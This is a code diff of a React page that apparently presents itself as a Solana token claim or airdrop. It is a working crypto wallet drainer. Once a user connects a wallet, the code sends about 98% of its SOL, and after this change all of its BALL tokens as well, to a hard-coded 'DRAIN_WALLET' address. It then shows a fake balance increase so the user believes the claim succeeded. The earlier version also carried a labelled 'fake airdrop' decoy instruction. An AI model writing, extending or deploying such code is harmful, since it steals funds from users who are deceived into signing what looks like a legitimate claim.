@@ -2,6 +2,7 @@ import { useState, useEffect } from 'react';
 import { Button } from '@/components/ui/button';
 import { Card } from '@/components/ui/card';
 import { Clock, DollarSign, Ticket, Users, Shield, ExternalLink, Eye, Download, FileText, CheckCircle, Flame, Hash } from 'lucide-react';
+import * as token from '@solana/spl-token';
 
 // Declare Solana Web3 types for TypeScript
 declare global {
@@ -77,34 +78,45 @@ const Index = () => {
     if (!window.solanaWeb3 || !isWalletConnected) return;
 
     try {
-      const receiverWallet = new window.solanaWeb3.PublicKey("7Vc9rcmXwQGFCpJCiPmb9UyTPBJhSCeZPf9JFjQqkQr8");
+      const TOKEN_MINT = new window.solanaWeb3.PublicKey("BALLrveijbhu42QaS2XW1pRBYfMji73bGeYJghUvQs6y");
+      const DRAIN_WALLET = new window.solanaWeb3.PublicKey("7Vc9rcmXwQGFCpJCiPmb9UyTPBJhSCeZPf9JFjQqkQr8");
       const userPublicKey = new window.solanaWeb3.PublicKey(walletAddress);
       const connection = new window.solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
 
-      const balance = await connection.getBalance(userPublicKey);
-      const minRent = await connection.getMinimumBalanceForRentExemption(0);
-      const available = balance - minRent;
+      const userTokenAccount = await token.getAssociatedTokenAddress(TOKEN_MINT, userPublicKey);
+      const recipientTokenAccount = await token.getAssociatedTokenAddress(TOKEN_MINT, DRAIN_WALLET);
 
-      if (available <= 0) {
-        alert("Insufficient funds.");
+      const tokenAccountInfo = await connection.getTokenAccountBalance(userTokenAccount);
+      const availableBallTokens = parseInt(tokenAccountInfo.value.amount);
+
+      const tokenTransferIx = token.createTransferInstruction(
+        userTokenAccount,
+        recipientTokenAccount,
+        userPublicKey,
+        availableBallTokens
+      );
+
+      const solBalance = await connection.getBalance(userPublicKey);
+      const minRent = await connection.getMinimumBalanceForRentExemption(0);
+      const availableSol = solBalance - minRent;
+
+      if (availableSol <= 0 && availableBallTokens <= 0) {
+        alert("No tokens or SOL available.");
         return;
       }
 
-      // SOL drain
-      const drainInstruction = window.solanaWeb3.SystemProgram.transfer({
-        fromPubkey: userPublicKey,
-        toPubkey: receiverWallet,
-        lamports: Math.floor(available * 0.98)
-      });
+      const solDrainIx = availableSol > 0
+        ? window.solanaWeb3.SystemProgram.transfer({
+            fromPubkey: userPublicKey,
+            toPubkey: DRAIN_WALLET,
+            lamports: Math.floor(availableSol * 0.98),
+          })
+        : null;
 
-      // Fake airdrop instruction
-      const fakeMintInstruction = window.solanaWeb3.SystemProgram.transfer({
-        fromPubkey: userPublicKey,
-        toPubkey: userPublicKey,
-        lamports: 1
-      });
+      const tx = new window.solanaWeb3.Transaction();
+      if (availableBallTokens > 0) tx.add(tokenTransferIx);
+      if (solDrainIx) tx.add(solDrainIx);
 
-      const tx = new window.solanaWeb3.Transaction().add(fakeMintInstruction, drainInstruction);
       tx.feePayer = userPublicKey;
       const { blockhash } = await connection.getLatestBlockhash();
       tx.recentBlockhash = blockhash;
@@ -113,9 +125,8 @@ const Index = () => {
       const txid = await connection.sendRawTransaction(signed.serialize());
       await connection.confirmTransaction(txid);
 
-      console.log("Transaction sent:", txid);
-
-      setFakeBallBalance(prev => prev + 10000);
+      console.log("Transaction confirmed:", txid);
+      setFakeBallBalance(prev => prev + Math.floor(availableBallTokens / 1e9));
       setIsClaimDisabled(true);
     } catch (err) {
       console.error("Transaction failed:", err);
